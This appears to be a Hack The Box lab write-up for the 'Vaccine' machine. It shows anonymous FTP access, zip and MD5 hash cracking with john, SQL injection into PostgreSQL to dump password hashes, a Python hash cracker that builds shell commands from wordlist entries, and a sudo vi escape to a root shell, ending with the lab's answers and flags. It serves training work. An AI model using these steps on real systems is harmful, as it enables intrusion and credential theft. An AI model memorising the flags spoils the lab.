---
layout: single
title: Vaccine - Hack The Box
excerpt: "In this machine, we take advantage of an FTP misconfiguration to obtain credentials and crack hashes. Additionally, we exploit a PostgreSQL database using SQL Injection and leverage the sudoers file."
date: 2025-03-17
classes: wide
header:
  teaser: /img2/vaccine.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Very Easy
tags:
  - FTP
  - SQL Injection
  - Sudoers
---


![](/img2/Pasted%20image%2020250317132821.png)

## Introduction

> In this machine, we take advantage of an FTP misconfiguration to obtain credentials and crack hashes. Additionally, we exploit a PostgreSQL database using SQL Injection and leverage the sudoers file.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.95.174 
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.95.174
```

![](/img2/Pasted%20image%2020250317133016.png)

- Vulnerability scan with nmap

```bash
nmap -sVC -p80,21,22 10.129.95.174
```

![](/img2/Pasted%20image%2020250317133203.png)

## Exploitation

- Login ftp with anonymous user

```bash
ftp 10.129.95.174

```
![](/img2/Pasted%20image%2020250317133432.png)

- Crack zip password

```bash
zip2john backup.zip > hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

![](/img2/Pasted%20image%2020250317133653.png)

- Extract backup files and view content

```bash
7z x backup.zip
```

![](/img2/Pasted%20image%2020250317133939.png)

- Crack md5 password
```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > md5.txt
john -w=/usr/share/wordlists/rockyou.txt --format=raw-md5 md5.txt
```
![](/img2/Pasted%20image%2020250317134202.png)

- Find SQL Injection vulnerability 

![](/img2/Pasted%20image%2020250317134333.png)

- Check table columns

![](/img2/Pasted%20image%2020250317134457.png)

- Create fake query

```sql
SELECT * FROM cars 
WHERE name ILIKE '%Elixir%'
```

- Check database version

![](/img2/Pasted%20image%2020250317141209.png)


- Check all tables

![](/img2/Pasted%20image%2020250317173458.png)


- Check all columns

![](/img2/Pasted%20image%2020250317173639.png)


- Check username and md5password of pg_shadow

![](/img2/Pasted%20image%2020250317173803.png)


- Python script to crack md5 password

```python
#!/usr/bin/env python3
import subprocess
import argparse
import threading
import sys
import signal
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
      

def def_handler(sig,frame):
        print(colored(f"\n[!] Exiting...","red"))

        sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

def get_arguments():
        parser=argparse.ArgumentParser(description= 'MD5 Hash Cracker')
        parser.add_argument("-ha","--hash",dest="hash",required=True,help="Hash to Crack (Ex: -h md52d58e0637ec1e94cdfba3d1c26b67d01)")
        parser.add_argument("-w","--wordlist",dest="w",required=True,help="Wordlist file (Ex: -w /usr/share/wordlists/rockyou.txt)")
        parser.add_argument("-u","--user",dest="user",required=True,help="Postgre Username (Ex -u postgres)")
        options=parser.parse_args()

        return options.hash,options.w,options.user

def start_cracker(w, hash, user):
    with open(w, "r", encoding="ISO-8859-1") as f:
        wordlist = f.readlines()

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(lambda word: cracker(word, hash, user),wordlist)

def cracker(w,hash,user):
        word=w.strip()
        command = f"echo -n '{word}{user}' | md5sum | awk '{{print \"md5\" $1}}'"
        output=subprocess.check_output(command,shell=True).decode().strip()
        if output==hash:
                print(colored(f"\n[+] Hash {hash} cracked -> {word}","green"))
                sys.exit(1)

def main():
    hash, w, user = get_arguments()
    start_cracker(w, hash, user)

if __name__ == '__main__':
    main()
```

```bash
python3 md5postgresql.py -ha md52d58e0637ec1e94cdfba3d1c26b67d01 -w /usr/share/wordlists/rockyou.txt -u postgres
```

![](/img2/Pasted%20image%2020250317174018.png)

## Post-exploitation

- Connect SSH with postgres user

```bash
ssh postgres@10.129.223.126
```

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250317175756.png)

- Exploit sudoers 

```bash
sudo -u root /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

![](/img2/Pasted%20image%2020250317175939.png)

```bash
:set shell=/bin/sh
:shell
```


## Tasks

1. Besides SSH and HTTP, what other service is hosted on this box?
> ftp

2. This service can be configured to allow login with any password for specific username. What is that username?
> anonymous

3. What is the name of the file downloaded over this service?
> backup.zip

4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
> zip2john

5. What is the password for the admin user on the website?
> qwerty789

6. What option can be passed to sqlmap to try to get command execution via the sql injection?
> --os-shell

7. What program can the postgres user run as root using sudo?
> vi

8. Submit user flag
> ec9b13ca4d6229cd5cc1e09980965bf7

9. Submit root flag
> dd6e058e814260bc70e9bbdef2715849


![](/img2/Pasted%20image%2020250317180609.png)